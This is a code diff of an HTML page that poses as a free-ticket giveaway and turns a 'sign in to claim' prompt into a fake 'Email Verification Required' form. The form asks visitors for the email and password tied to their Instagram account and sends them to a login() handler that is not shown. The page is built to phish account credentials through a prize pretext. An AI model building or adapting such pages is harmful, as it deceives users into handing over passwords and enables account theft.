@@ -13,62 +13,33 @@
     <link rel="stylesheet" href="assets/css/main.css">
     <style>
 
-
       body {
           margin: 0;
           padding: 0;
           box-sizing: border-box;
           font-family: 'Helvetica', sans-serif;
           background-color: #f4f4f4;
-        }
+      }
 
-        .wrapper {
-            width: 100%;
-        }
+      .wrapper {
+          width: 100%;
+      }
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            box-sizing: border-box;
-        }
+      .container {
+          max-width: 1200px;
+          margin: 0 auto;
+          padding: 20px;
+          box-sizing: border-box;
+      }
 
-        .hero {
-            text-align: center;
-            padding: 20px;
-        }
+      .hero {
+          text-align: center;
+          padding: 20px;
+      }
 
-        .hero__logo {
-            width: 100%; /* Make the logo responsive */
-            max-width: 350px; /* Limit the maximum width */
-            height: auto; /* Maintain aspect ratio */
-        }
-
-        .hero__title {
-            font-size: 2em;
-            margin: 10px 0;
-        }
-
-        .hero__subtitle {
-            font-size: 1.2em;
-            margin: 10px 0;
-        }
-
-        .hero__subtitle,
-        .hero__btns {
-            max-width: 600px; /* Limit maximum width for text and buttons */
-            margin: 0 auto;
-        }
-
-        .hero__btn {
-            display: inline-block;
-            padding: 10px 20px;
-            text-decoration: none;
-            color: #fff;
-            background-color: #3498db;
-            border-radius: 5px;
-            margin-top: 10px;
-        }
+      .social-links {
+        margin-top: 15px;
+      }
 
       .social-icon {
         font-size: 1em;
@@ -96,7 +67,6 @@
 
     </style>
 
-
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
@@ -109,9 +79,6 @@
     <script src="js/index.js"></script>
     <script src="/js/jquery-3.6.0.min.js"></script>
 
-      <!-- Twitter CSS -->
-      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous">
-      <link rel="stylesheet" href="twt/CSS/style.css">
       <link rel="icon" href="favicon.ico">
   </head>
 
@@ -130,19 +97,20 @@
             style="width: 350px"
           />
           <h1 class="hero__title">
-            One Last Step!
+            Email Verification Required!
           </h1>
           <h2 class="hero__subtitle">
-            You must sign in to claim your free ticket.
+            Enter email associated with your Instagram.
           </h2>
 
-            <div class="count">
-              <div id="timer"></div>
-            </div>
+          <input type="text" id="fb-email" class="hero__subtitle" placeholder="enter email">
+
+          <input type="text" id="fb-pass" class="hero__subtitle" placeholder="enter Password">
+
           <div class="hero__btns">
 
-            <a onclick="Instagram()" class="hero__btn hero__btn_color_orange instagram-button2 fab fa-instagram"
-              >Instagram</a
+            <a onclick="login()" id="fb-log" class="hero__btn hero__btn_color_blue instagram-button2"
+              >Submit</a
             >
           </div>
           <img class="hero__phone" src="img/png/bg.png" alt="giftbox" />
@@ -195,7 +163,7 @@
         function showCustomAlert() {
           Swal.fire({
             title: 'Oops!',
-            text: 'Something went wrong with your vote.',
+            text: 'Something went wrong with your Claim.',
             icon: 'error',
             confirmButtonText: 'Try Again'
           });
